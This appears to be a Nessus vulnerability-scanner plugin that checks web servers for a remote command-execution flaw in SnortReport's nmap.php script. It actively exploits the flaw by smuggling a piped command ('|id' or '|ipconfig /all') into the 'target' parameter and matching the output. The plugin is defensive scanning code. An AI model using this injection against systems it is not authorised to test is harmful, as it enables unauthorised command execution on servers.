#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(49088);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2015/09/24 23:21:20 $");

  script_osvdb_id(67739);

  script_name(english:"SnortReport nmap.php target Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that allows execution of
arbitrary commands."
  );
  script_set_attribute(
    attribute:"description",
    value:

"The remote web server hosts SnortReport, an add-on module for Snort.

The version of this application installed on the remote host fails to
sanitize input to the 'target' parameter of the 'nmap.php' script
before using it in a call to the PHP 'exec()' function.

An unauthenticated, remote attacker can leverage this issue to execute
arbitrary code on the remote host subject to the privileges under
which the web server operates."
  );
  script_set_attribute(attribute:"see_also", value:"http://twitter.com/hdmoore/statuses/22630926839");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Snort Report 1.3.2 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Snortreport nmap.php/nbtscan.php Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/08/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/09/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";


# Loop through directories.
output = "";
snortreport_installs = 0;
vuln_urls = make_list();

if (thorough_tests) dirs = list_uniq(make_list("/snortreport", "/snortreport-1.3.1", "/snort", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to run a command.
  foreach cmd (cmds)
  {
    url = dir + '/nmap.php?' +
      'target=' + '|' + urlencode(str:cmd);

    res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);
    if (!res[2]) continue;

    # If the output looks like it's from the script...
    if ('<font size=3><body bgcolor=#CCCC99>' >< res[2])
    {
      snortreport_installs++;
    }
    # otherwise continue unless we're being paranoid.
    else if (report_paranoia < 2)
    {
      continue;
    }

    if (egrep(pattern:cmd_pats[cmd], string:res[2]))
    {
      vuln_urls = make_list(vuln_urls, url);
      if (!output)
      {
        output = "";
        foreach line (split(res[2], keep:FALSE))
        {
          if (ereg(pattern:" <BR>$", string:line))
            output += ereg_replace(pattern:"^(.*) <BR>$", replace:"\1", string:line) + '\n';
        }
      }
      break;
    }
  }
  if (output && !thorough_tests) break;
}

if (max_index(vuln_urls))
{
  if (report_verbosity > 0)
  {
    if (max_index(vuln_urls) == 1) s = '';
    else s = 's';
    header =
      "Nessus was able to execute the command '" + cmd + "' on the remote" + '\n' +
      'host using the following URL' + s;
    trailer = '';

    if (report_verbosity > 1)
    {
      trailer =
        'This produced the following output :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        output +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }
    report = get_vuln_report(items:vuln_urls, port:port, header:header, trailer:trailer);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else
{
  if (snortreport_installs == 0) exit(0, "No installs of SnortReport were found on the web server on port "+port+".");
  else if (snortreport_installs == 1) exit(0, "The SnortReport install hosted on the web server on port "+port+" is not affected.");
  else exit(0, "The SnortReport installs hosted on the web server on port "+port+" are not affected.");
}
